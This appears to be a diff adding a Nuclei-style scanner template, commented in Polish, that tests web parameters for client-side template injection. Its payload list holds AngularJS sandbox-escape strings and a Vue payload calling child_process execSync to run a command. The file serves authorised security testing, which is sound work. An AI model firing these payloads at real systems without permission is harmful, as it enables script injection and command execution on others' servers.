@@ -1,0 +1,104 @@
+# ============================================================================
+# WSTG-CLNT-15: Client-side Template Injection - CSTI (Universal)
+# ============================================================================
+#
+# Coverage: CSTI w popularnych frontend frameworkach (Angular.js, Vue, Handlebars,
+# Mustache). Reflection user input w template syntax {{...}} bez escaping →
+# JavaScript execution w sandbox (lub bypass do RCE w niektórych frameworkach).
+# ============================================================================
+
+id: wstg-clnt-15-csti
+
+info:
+  name: "WSTG-CLNT-15: Client-side Template Injection - CSTI (Universal)"
+  author: pentest-team
+  severity: high
+  description: |
+    Wykrywa Client-Side Template Injection: reflection user input w syntax
+    {{...}} (Angular/Vue/Handlebars/Mustache) bez sanityzacji. Pivot do
+    JavaScript execution (sandbox) lub bypass do XSS.
+  reference:
+    - https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/11-Client-side_Testing/15-Testing_for_Client-side_Template_Injection
+    - https://portswigger.net/research/server-side-template-injection
+    - https://book.hacktricks.xyz/pentesting-web/client-side-template-injection-csti
+  classification:
+    cwe-id: CWE-79,CWE-1336
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N
+    cvss-score: 8.8
+  tags: dast,wstg,wstg-v42-clnt-15,csti,xss,burp-history
+
+variables:
+  canary: "wstg{{rand_text_alpha(8)}}"
+  auth_token: ""
+  session_cookie: ""
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method != "OPTIONS"'
+          - 'method != "HEAD"'
+          - 'method != "DELETE"'
+          - '!regex("(?i)\\.(js|css|png|jpg|jpeg|gif|svg|ico|woff2?|ttf|otf|eot|map|pdf|zip)(\\?|$)", path)'
+          - '!regex("(?i)/(delete|cancel|drop|destroy|remove|purge|wipe|reset|terminate)(/|$|\\?)", path)'
+        condition: and
+
+    payloads:
+      injection:
+        # Math evaluation - klasyk SSTI/CSTI
+        - "{{ '7'*7 }}"                              # Vue - "7777777" if reflected
+        - "{{7*7}}"                                  # Angular/Mustache - 49 if executed
+        - "{{ 7*7 }}"
+        # Constructor escape (AngularJS sandbox bypass)
+        - "{{constructor.constructor('alert({{canary}})')()}}"
+        # Vue 2 sandbox escape
+        - "{{constructor.constructor('return process')().mainModule.require('child_process').execSync('id')}}"
+        # Angular 1.x ng-app evaluation
+        - "{{$on.constructor('alert({{canary}})')()}}"
+        # Reflection canary - just to detect template eval
+        - "{{ {{canary}}.length }}"
+        - "{{ ['{{canary}}'].length }}"
+
+    fuzzing:
+      - parts: [query, body, cookie]
+        type: postfix
+        mode: single
+        fuzz:
+          - "{{url_encode(injection)}}"
+
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      # Primary: 49 (= 7*7) reflected w body
+      - type: regex
+        part: body
+        name: csti-math-evaluated
+        regex:
+          - "\\b49\\b(?![\\d.])"            # 49 jako standalone number
+          - "(?<![\\w.])7777777(?![\\w])"   # Vue '7'*7 = "7777777"
+
+      # Secondary: HTML/JSON content (renderable for client-side)
+      - type: regex
+        part: header
+        name: client-side-content-type
+        regex:
+          - "(?i)content-type:\\s*(?:text/html|application/json|application/javascript)"
+
+      # Anti-FP: nasz canary echo (potwierdza reflection)
+      - type: word
+        part: body
+        name: payload-context-confirmed
+        words:
+          - "{{canary}}"
+        condition: or
+        # OR: gdy "49" jest w body, ale niezależnie - bo nie zawsze canary
+
+# ============================================================================
+# Known limitations:
+# - 49 może być normalnym number w aplikacji (false positive). Wymaga
+#   manualnej weryfikacji że to wynik 7*7.
+# - Wykrywanie tylko klasycznych frameworków (Angular/Vue/Handlebars).
+# - Dla SSTI (server-side template injection) - patrz WSTG-INPV-18.
+# - AngularJS Sandbox escape wymaga konkretnej wersji - PortSwigger Lab dla
+#   per-version exploitation.
+# ============================================================================
